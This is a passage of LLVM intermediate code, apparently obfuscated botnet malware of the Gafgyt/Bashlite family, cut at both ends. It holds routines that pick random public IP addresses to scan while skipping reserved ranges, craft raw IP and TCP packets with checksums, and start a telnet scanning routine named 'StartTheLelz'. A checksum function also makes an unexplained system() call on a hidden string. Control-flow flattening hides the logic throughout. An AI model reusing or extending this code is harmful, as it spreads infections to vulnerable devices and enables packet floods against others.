    i32 -2006957858, label %193
    i32 -1551420896, label %195
    i32 81792535, label %212
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 0
  %25 = select i1 %24, i32 -2006957858, i32 774548119
  store i32 %25, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 10
  %31 = select i1 %30, i32 -2006957858, i32 14155898
  store i32 %31, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 100
  %37 = select i1 %36, i32 -906294348, i32 538323779
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp sge i32 %41, 64
  %43 = select i1 %42, i32 1997956185, i32 538323779
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %46 = load i8, i8* %45, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp sle i32 %47, 127
  %49 = select i1 %48, i32 -2006957858, i32 538323779
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 127
  %55 = select i1 %54, i32 -2006957858, i32 -371975530
  store i32 %55, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 169
  %61 = select i1 %60, i32 1156196574, i32 2140141164
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 254
  %67 = select i1 %66, i32 -2006957858, i32 2140141164
  store i32 %67, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 172
  %73 = select i1 %72, i32 944821456, i32 2095486349
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %76 = load i8, i8* %75, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp sle i32 %77, 16
  %79 = select i1 %78, i32 -1855395651, i32 2095486349
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp sle i32 %83, 31
  %85 = select i1 %84, i32 -2006957858, i32 2095486349
  store i32 %85, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 192
  %91 = select i1 %90, i32 -878544075, i32 1050220838
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %94 = load i8, i8* %93, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 0
  %97 = select i1 %96, i32 672923221, i32 1050220838
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 2
  %103 = select i1 %102, i32 -2006957858, i32 1050220838
  store i32 %103, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %106 = load i8, i8* %105, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 192
  %109 = select i1 %108, i32 -766791674, i32 1452747932
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 88
  %115 = select i1 %114, i32 1621326798, i32 1452747932
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 99
  %121 = select i1 %120, i32 -2006957858, i32 1452747932
  store i32 %121, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %124 = load i8, i8* %123, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 192
  %127 = select i1 %126, i32 956095960, i32 -495424337
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 168
  %133 = select i1 %132, i32 -2006957858, i32 -495424337
  store i32 %133, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 198
  %139 = select i1 %138, i32 -159157422, i32 -495462186
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 18
  %145 = select i1 %144, i32 -2006957858, i32 -483620126
  store i32 %145, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 19
  %151 = select i1 %150, i32 -2006957858, i32 -495462186
  store i32 %151, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %154 = load i8, i8* %153, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 198
  %157 = select i1 %156, i32 -309235665, i32 -1140491360
  store i32 %157, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 51
  %163 = select i1 %162, i32 354103264, i32 -1140491360
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %166 = load i8, i8* %165, align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 100
  %169 = select i1 %168, i32 -2006957858, i32 -1140491360
  store i32 %169, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 203
  %175 = select i1 %174, i32 1787365275, i32 378425636
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %178 = load i8, i8* %177, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 0
  %181 = select i1 %180, i32 -578114885, i32 378425636
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 113
  %187 = select i1 %186, i32 -2006957858, i32 378425636
  store i32 %187, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp sge i32 %191, 224
  store i32 -2006957858, i32* %switchVar
  store i1 %192, i1* %.reg2mem
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %194 = select i1 %.reload, i32 -1551420896, i32 81792535
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = call i32 @rand() #2
  %197 = srem i32 %196, 255
  %198 = trunc i32 %197 to i8
  %199 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %198, i8* %199, align 1
  %200 = call i32 @rand() #2
  %201 = srem i32 %200, 255
  %202 = trunc i32 %201 to i8
  %203 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %202, i8* %203, align 1
  %204 = call i32 @rand() #2
  %205 = srem i32 %204, 255
  %206 = trunc i32 %205 to i8
  %207 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %206, i8* %207, align 1
  %208 = call i32 @rand() #2
  %209 = srem i32 %208, 255
  %210 = trunc i32 %209 to i8
  %211 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %210, i8* %211, align 1
  store i32 -478127582, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %213, i8 0, i64 16, i32 16, i1 false)
  %214 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %215 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %216 = load i8, i8* %215, align 1
  %217 = zext i8 %216 to i32
  %218 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %219 = load i8, i8* %218, align 1
  %220 = zext i8 %219 to i32
  %221 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = call i32 (i8*, i8*, ...) @szprintf(i8* %214, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i32 0, i32 0), i32 %217, i32 %220, i32 %223, i32 %226)
  %228 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %229 = call i32 @inet_addr(i8* %228) #2
  ret i32 %229

loopEnd:                                          ; preds = %195, %193, %188, %182, %176, %170, %164, %158, %152, %146, %140, %134, %128, %122, %116, %110, %104, %98, %92, %86, %80, %74, %68, %62, %56, %50, %44, %38, %32, %26, %20, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -1370622022, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1370622022, label %6
    i32 -1492467178, label %10
    i32 -1501325896, label %19
    i32 -1371559998, label %23
    i32 2035568246, label %30
    i32 -47564558, label %31
    i32 1327280836, label %36
    i32 214768640, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -1492467178, i32 -1501325896
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -1370622022, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 -1371559998, i32 2035568246
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 2035568246, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -47564558, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 1327280836, i32 214768640
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -47564558, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = call i32 @system(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.74, i32 0, i32 0))
  %43 = load i16*, i16** %8, align 8
  %44 = bitcast i16* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i16, i16* %9, align 2
  ret i16 %45
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 395039192, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 395039192, label %first
    i32 275778099, label %7
    i32 901773174, label %8
    i32 -1301880601, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 275778099, i32 901773174
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1301880601, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -1301880601, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %.reg2mem180 = alloca i32
  %.reg2mem18 = alloca %struct.telstate_t*
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1645658071, i32* %switchVar
  %.reg2mem191 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar17 = load i32, i32* %switchVar
  switch i32 %switchVar17, label %switchDefault [
    i32 -1645658071, label %first
    i32 1764689005, label %20
    i32 2032416795, label %21
    i32 -611683437, label %23
    i32 2104945780, label %37
    i32 100776713, label %42
    i32 379279422, label %57
    i32 -611762432, label %60
    i32 -697128831, label %63
    i32 -1314709689, label %64
    i32 -1990651907, label %65
    i32 -1913512431, label %70
    i32 12046569, label %NodeBlock15
    i32 1776961603, label %NodeBlock13
    i32 1131842236, label %NodeBlock11
    i32 1972332518, label %NodeBlock9
    i32 -1528136132, label %LeafBlock7
    i32 -2076718687, label %NodeBlock5
    i32 641790664, label %NodeBlock3
    i32 1237049388, label %NodeBlock1
    i32 -340077843, label %NodeBlock
    i32 -2009072250, label %LeafBlock
    i32 -735080750, label %87
    i32 -236434822, label %100
    i32 1138162952, label %120
    i32 1392333764, label %135
    i32 515986318, label %146
    i32 659824931, label %155
    i32 729259410, label %160
    i32 -500986995, label %161
    i32 -1057887565, label %200
    i32 313996798, label %201
    i32 -1946243896, label %224
    i32 557556498, label %229
    i32 -1019922968, label %240
    i32 1003208940, label %249
    i32 1220165356, label %250
    i32 -1305709895, label %258
    i32 858705714, label %264
    i32 1753808057, label %265
    i32 1693151921, label %274
    i32 33112631, label %275
    i32 -1107482554, label %307
    i32 646440784, label %318
    i32 -1384286302, label %333
    i32 1486175026, label %364
    i32 662002981, label %365
    i32 1573552594, label %369
    i32 717575377, label %384
    i32 -1818707963, label %385
    i32 457003979, label %395
    i32 376214968, label %410
    i32 943636615, label %411
    i32 -32227355, label %419
    i32 -676689760, label %425
    i32 -874048147, label %434
    i32 576628395, label %439
    i32 -199589089, label %459
    i32 -113002571, label %477
    i32 1055779424, label %489
    i32 1369927251, label %499
    i32 -987137798, label %514
    i32 -863952088, label %515
    i32 -1357143724, label %541
    i32 164530048, label %556
    i32 70113988, label %565
    i32 -1487877315, label %580
    i32 1459210137, label %585
    i32 -1216950786, label %593
    i32 -1681101598, label %599
    i32 -1220786600, label %619
    i32 -1649252881, label %662
    i32 1910311141, label %667
    i32 -967861305, label %672
    i32 12893266, label %678
    i32 578305680, label %687
    i32 2021749991, label %702
    i32 -607143118, label %714
    i32 -1775708556, label %724
    i32 244697961, label %739
    i32 -1418949054, label %740
    i32 1186893656, label %766
    i32 1915860606, label %781
    i32 1466926842, label %790
    i32 -1551062616, label %805
    i32 593353473, label %810
    i32 -1260053952, label %818
    i32 632609666, label %824
    i32 -640661026, label %844
    i32 -1238998804, label %861
    i32 807031445, label %881
    i32 -2044842187, label %890
    i32 1127872437, label %910
    i32 -12158228, label %915
    i32 1794224934, label %921
    i32 -44693808, label %933
    i32 214912010, label %943
    i32 1754148358, label %958
    i32 1844374457, label %959
    i32 -2132064941, label %968
    i32 -1618804612, label %983
    i32 -1561553475, label %988
    i32 799219278, label %996
    i32 -990461979, label %1002
    i32 1320983696, label %1014
    i32 2115316885, label %1034
    i32 292964970, label %1070
    i32 -1305401158, label %1111
    i32 -195535381, label %NewDefault
    i32 1729329605, label %1112
    i32 794347618, label %1113
    i32 -1657164727, label %1116
    i32 1578372464, label %1117
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp sgt i32 %.reload, 512
  %19 = select i1 %18, i32 1764689005, i32 2032416795
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 -611683437, i32* %switchVar
  store i32 512, i32* %.reg2mem191
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i32, i32* %1, align 4
  store i32 -611683437, i32* %switchVar
  store i32 %22, i32* %.reg2mem191
